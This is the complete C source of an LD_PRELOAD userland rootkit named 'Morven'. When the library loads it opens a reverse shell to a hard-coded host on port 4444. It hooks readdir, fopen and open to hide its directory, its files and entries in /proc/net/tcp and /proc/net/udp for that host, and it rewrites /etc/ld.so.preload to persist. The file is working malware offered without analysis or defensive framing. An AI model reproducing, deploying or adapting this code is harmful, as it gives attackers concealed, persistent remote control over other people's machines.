#define _GNU_SOURCE 
#define __USE_GNU 

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/limits.h>

#define HIDDEN_DIR "secret"
#define HIDDEN_FILE "ld.so.preload"
#define HIDDEN_HOST "10.8.150.54"
#define LINE_MAX 1024

#define SHELL "/bin/sh"
#define PORT 4444
#define HOST "10.8.150.54"
#define NAME "morven"
#define PROCESS_NAME "/usr/bin/morven"
#define HIDDEN_GID 1001

static char *resolved_libpath = NULL;

/* --------------------- Restore Logic --------------------- */
void __attribute__((constructor)) resolve_libpath() {
    Dl_info info;
    if (dladdr(resolve_libpath, &info) == 0) return;

    resolved_libpath = realpath(info.dli_fname, NULL);
    if (!resolved_libpath) {
        resolved_libpath = malloc(strlen(info.dli_fname)+1);
        if (!resolved_libpath) return;
        strcpy(resolved_libpath, info.dli_fname);
    }
}

int cmp_files(char *file1, char *file2) {
    FILE *f1 = fopen(file1,"r");
    if(!f1) return 1;
    FILE *f2 = fopen(file2,"r");
    if(!f2){ fclose(f1); return 1; }

    int c1=0,c2=0;
    while(c1==c2 && c1!=EOF){
        c1=getc(f1);
        c2=getc(f2);
    }
    int ret = !(feof(f1)&&feof(f2));
    fclose(f1);
    fclose(f2);
    return ret;
}

void self_restore() {
    if(!resolved_libpath) return;
    if(geteuid()!=0) return;

    char line[PATH_MAX+500], addr[100], path[PATH_MAX];
    char proc_path[sizeof("/proc/self/map_files/")+100] = "/proc/self/map_files/";
    int inode;

    FILE *f=fopen("/proc/self/maps","r");
    if(!f) { free(resolved_libpath); return; }

    while(strcmp(path,resolved_libpath)!=0 && fgets(line,sizeof(line),f)) {
        sscanf(line,"%s %*s %*s %*s %i %s", addr,&inode,path);
    }
    if(strcmp(path,resolved_libpath)!=0){ fclose(f); free(resolved_libpath); return; }
    strncat(proc_path,addr,100);
    fclose(f);

    struct stat sb;
    if(stat(resolved_libpath,&sb)==-1 || (inode!=sb.st_ino && cmp_files(proc_path,resolved_libpath))) {
        remove(resolved_libpath);
        int fd_in=open(proc_path,O_RDONLY);
        int fd_out=open(resolved_libpath,O_WRONLY|O_CREAT|O_TRUNC,0644);
        char buf[4096]; int bytes=read(fd_in,buf,sizeof(buf));
        while(bytes>0 && write(fd_out,buf,bytes)!=-1) bytes=read(fd_in,buf,sizeof(buf));
        close(fd_in); close(fd_out);
    }

    int fd=open("/etc/ld.so.preload",O_WRONLY|O_TRUNC|O_CREAT,0644);
    if(fd!=-1){
        write(fd,resolved_libpath,strlen(resolved_libpath));
        close(fd);
    }
}

/* --------------------- Syscall Helpers --------------------- */
static void *syscall_address(void *ptr, const char *symbol) {
    if(!ptr) ptr=dlsym(RTLD_NEXT,symbol);
    if(!ptr) exit(EXIT_FAILURE);
    return ptr;
}

/* --------------------- Hiding --------------------- */
static int hide_name(const char *name) {
    return strcmp(name,HIDDEN_DIR)==0 || strcmp(name,HIDDEN_FILE)==0 || (resolved_libpath && strcmp(name,resolved_libpath)==0);
}

static struct dirent *(*orig_readdir)(DIR*)=NULL;
struct dirent *readdir(DIR *dirp){
    orig_readdir = syscall_address(orig_readdir,"readdir");
    struct dirent *entry;
    while((entry=orig_readdir(dirp))){
        if(!hide_name(entry->d_name)) return entry;
    }
    return NULL;
}

static struct dirent64 *(*orig_readdir64)(DIR*)=NULL;
struct dirent64 *readdir64(DIR *dirp){
    orig_readdir64 = syscall_address(orig_readdir64,"readdir64");
    struct dirent64 *entry;
    while((entry=orig_readdir64(dirp))){
        if(!hide_name(entry->d_name)) return entry;
    }
    return NULL;
}

/* --------------------- Proc Net Hiding --------------------- */
static int is_procnet(const char *pathname){
    return strncmp(pathname,"/proc/",6)==0 && (strstr(pathname,"/net/tcp") || strstr(pathname,"/net/udp"));
}

static int forge_procnet(const char *pathname){
    static FILE *(*orig_fopen)(const char*,const char*)=NULL;
    static int (*orig_open)(const char*,int,...)=NULL;
    orig_fopen=syscall_address(orig_fopen,"fopen");
    orig_open=syscall_address(orig_open,"open");

    FILE *fptr=orig_fopen(pathname,"r");
    int forged_fd=orig_open("/tmp",O_TMPFILE|O_EXCL|O_RDWR,0644);
    if(!fptr || forged_fd==-1) return -1;

    char line[LINE_MAX];
    while(fgets(line,sizeof(line),fptr)){
        char rem[128],local[128]; int rport,lport,state,d,uid,timer,tout;
        unsigned long txq,rxq,tlen,retr,inode; char more[512+1];
        sscanf(line,"%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n",
               &d,local,&lport,rem,&rport,&state,&txq,&rxq,&timer,&tlen,&retr,&uid,&tout,&inode,more);
        int oct[4]; sscanf(rem,"%2x%2x%2x%2x",oct+3,oct+2,oct+1,oct);
        char rip[16]; snprintf(rip,sizeof(rip),"%d.%d.%d.%d",oct[0],oct[1],oct[2],oct[3]);
        if(strcmp(rip,HIDDEN_HOST)==0) continue;
        write(forged_fd,line,strlen(line));
    }
    fclose(fptr);
    lseek(forged_fd,0,SEEK_SET);
    return forged_fd;
}

static FILE *(*orig_fopen)(const char*,const char*)=NULL;
FILE *fopen(const char *pathname,const char *mode){
    orig_fopen=syscall_address(orig_fopen,"fopen");
    if(strstr(pathname,HIDDEN_FILE) || is_procnet(pathname)){
        int fd=forge_procnet(pathname);
        if(fd!=-1) return fdopen(fd,"r");
        errno=ENOENT; return NULL;
    }
    return orig_fopen(pathname,mode);
}

static int (*orig_open)(const char*,int,...)=NULL;
int open(const char *pathname,int flags,...){
    va_list args; mode_t mode=0;
    if(flags&O_CREAT){ va_start(args,flags); mode=va_arg(args,int); va_end(args);}
    orig_open=syscall_address(orig_open,"open");

    if(is_procnet(pathname)){
        int fd=forge_procnet(pathname);
        if(fd!=-1) return fd;
        errno=ENOENT; return -1;
    }

    if(flags&O_CREAT) return orig_open(pathname,flags,mode);
    return orig_open(pathname,flags);
}

static int (*orig_mkdir)(const char*,mode_t)=NULL;
int mkdir(const char *pathname,mode_t mode){
    orig_mkdir=syscall_address(orig_mkdir,"mkdir");
    return orig_mkdir(pathname,mode);
}

/* --------------------- Environment Protection --------------------- */
void protect_env(){
    if(getenv("LD_PRELOAD")) setenv("LD_PRELOAD","/usr/lib/libc.so.6",1);
}

/* --------------------- Reverse Shell --------------------- */
void revshell(){
    pid_t pid=fork();
    if(pid==0){
        daemon(0,1);
        int sockfd=socket(AF_INET,SOCK_STREAM,0);
        struct sockaddr_in addr={0};
        addr.sin_family=AF_INET;
        addr.sin_port=htons(PORT);
        addr.sin_addr.s_addr=inet_addr(HOST);

        if(connect(sockfd,(struct sockaddr*)&addr,sizeof(addr))==-1) exit(EXIT_FAILURE);
        dup2(sockfd,0); dup2(sockfd,1); dup2(sockfd,2);

        FILE *f=fdopen(sockfd,"w");
        fprintf(f,"******************************\nMorven\nDarkness lies behind the keyboards %s\n******************************\n",NAME);
        fclose(f);

        setgid(HIDDEN_GID);
        char *argv[]={PROCESS_NAME,NULL};
        execve(SHELL,argv,NULL);
        exit(EXIT_SUCCESS);
    }
}

/* --------------------- Constructor & Destructor --------------------- */
__attribute__((constructor)) void init_kit(){
    protect_env();
    revshell();
}

__attribute__((destructor)) void exit_kit(){
    self_restore();
}
